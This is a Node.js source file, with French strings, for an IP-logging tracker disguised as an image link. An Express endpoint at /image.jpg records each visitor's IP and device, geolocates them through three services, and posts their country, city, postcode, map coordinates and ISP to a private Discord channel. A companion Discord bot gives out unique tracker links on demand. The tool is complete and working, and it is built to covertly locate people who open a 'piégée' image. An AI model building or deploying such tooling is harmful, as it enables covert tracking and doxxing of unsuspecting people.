const express = require('express');
const cors = require('cors');
const maxmind = require('maxmind');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const DeviceDetector = require('device-detector-js');
require('dotenv').config();

const {
  Client,
  GatewayIntentBits,
  Partials,
  Events,
  ButtonBuilder,
  ActionRowBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');

const port = process.env.PORT || 3000;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
const BDC_TOKEN = process.env.BDC_TOKEN;
const TRACKER_BASE_URL = "https://tracker-09q2.onrender.com/image.jpg?u=";
const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
const CLIENTS_FILE = './clients.json';

const app = express();
app.use(cors());
const deviceDetector = new DeviceDetector();

let lookup;
(async () => {
  lookup = await maxmind.open('./GeoLite2-City.mmdb');
})();

function compareFields(label, ...values) {
  const clean = values.filter(v => v && v !== 'undefined');
  const unique = [...new Set(clean.map(v => v.toLowerCase?.() || v))];
  const emoji = unique.length === 1 ? '✅' : '⚠️';
  return `**${label} :** ${clean.join(' / ') || '❌ Introuvable'} ${emoji}`;
}

function getBestCoord(...coords) {
  for (let c of coords) {
    if (c && c.includes(',')) return c;
  }
  return null;
}
app.get('/image.jpg', async (req, res) => {
  const queryId = req.query.u;
  if (!queryId) return res.status(400).send("Lien invalide");

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const device = deviceDetector.parse(userAgent);

  let geo = {}, ipinfo = {}, bigdata = {};

  try {
    geo = lookup.get(ip) || {};
  } catch {}

  try {
    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
    ipinfo = data;
  } catch {}

  try {
    const { data } = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
    bigdata = data;
  } catch {}

  const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
  const coordsBigData = bigdata?.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
  const coordsIpinfo = ipinfo?.loc || null;

  const bestCoords = getBestCoord(coordsBigData, coordsIpinfo, coordsMaxMind);
  const coordsField = bestCoords
    ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
    : '❌ Introuvable';

  const embed = new EmbedBuilder()
    .setTitle("📸 Image piégée ouverte !")
    .setDescription(`**IP :** ${ip}\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
    .setColor(0xff6600)
    .addFields(
      { name: "🌍 Localisation", value: [
        compareFields("Pays", bigdata.country?.name, ipinfo.country, geo?.country?.names?.fr),
        compareFields("Région", bigdata.principalSubdivision, ipinfo.region, geo?.subdivisions?.[0]?.names?.fr),
        compareFields("Ville", bigdata.city?.name, ipinfo.city, geo?.city?.names?.fr),
        compareFields("Code postal", bigdata.postcode, ipinfo.postal, geo?.postal?.code),
        `**Coordonnées :** ${coordsField} ${coordsBigData && coordsIpinfo && coordsMaxMind ? '⚠️' : '✅'}`,
        compareFields("FAI", ipinfo.org, geo?.traits?.isp)
      ].join('\n') }
    )
    .setFooter({ text: "🔍 Tracker avancé", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
    .setTimestamp();
  try {
    if (fs.existsSync(CLIENTS_FILE)) {
      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
      const channelId = clients[queryId];

      if (channelId) {
        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
          embeds: [embed]
        }, {
          headers: {
            Authorization: `Bot ${DISCORD_TOKEN}`,
            'Content-Type': 'application/json'
          }
        });
      }
    }
  } catch (err) {
    console.log("❌ Erreur Discord log :", err.message);
  }

  res.status(204).send();
});
app.listen(port, () => {
  console.log(`🛰️ Serveur Express actif sur le port ${port}`);
});

// DISCORD BOT
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
  partials: [Partials.Channel]
});

client.once(Events.ClientReady, async () => {
  console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);

  const guild = client.guilds.cache.first();
  const channel = guild.channels.cache.find(c => c.name.includes("génère") && c.isTextBased());

  if (!channel) return console.log("❌ Salon 'génère-lien-tracker' introuvable");

  const messages = await channel.messages.fetch({ limit: 10 });
  const oldMsg = messages.find(msg => msg.author.id === client.user.id && msg.content.includes("[TRACKER_BOUTON]"));

  if (oldMsg) {
    console.log("✅ Message bouton déjà présent.");
    return;
  }

  const bouton = new ButtonBuilder()
    .setCustomId("generate_tracker")
    .setLabel("🔗 Générer mon lien")
    .setStyle(ButtonStyle.Primary);

  const row = new ActionRowBuilder().addComponents(bouton);

  const message = await channel.send({
    content: "[TRACKER_BOUTON] 🎯 Clique sur le bouton ci-dessous pour générer ton lien tracker personnalisé 👇",
    components: [row]
  });

  await message.pin();
  console.log("✅ Message bouton envoyé et épinglé !");
});
client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId !== "generate_tracker") return;

  try {
    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;
    const user = interaction.user;

    const shortId = crypto.randomBytes(3).toString("hex");
    const channelName = `🔗・mon-lien-tracker-${shortId}`;

    const privateChannel = await guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: guild.roles.everyone, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory], deny: [
          PermissionsBitField.Flags.SendMessages,
          PermissionsBitField.Flags.AttachFiles,
          PermissionsBitField.Flags.EmbedLinks,
          PermissionsBitField.Flags.MentionEveryone,
          PermissionsBitField.Flags.AddReactions
        ] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.EmbedLinks, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ManageChannels] }
      ]
    });

    const uniqueId = `${user.id}_${shortId}`;
    const trackerUrl = `${TRACKER_BASE_URL}${uniqueId}`;

    await privateChannel.send({
      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.\n⏳ *Ce salon sera supprimé dans 15 minutes...*`
    });

    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }

    clients[uniqueId] = privateChannel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));

    await interaction.editReply({
      content: `✅ Ton lien a été généré ici : <#${privateChannel.id}>`,
      ephemeral: true
    });

    setTimeout(async () => {
      try {
        await privateChannel.delete();
        console.log(`🗑️ Salon supprimé automatiquement : ${privateChannel.name}`);
      } catch (err) {
        console.error("❌ Erreur suppression salon :", err.message);
      }
    }, 15 * 60 * 1000); // 15 minutes

  } catch (err) {
    console.error("❌ Erreur Interaction :", err);
    if (interaction.replied || interaction.deferred) {
      await interaction.editReply({ content: "❌ Une erreur est survenue." });
    } else {
      await interaction.reply({ content: "❌ Impossible de traiter la demande.", ephemeral: true });
    }
  }
});

client.login(DISCORD_TOKEN);
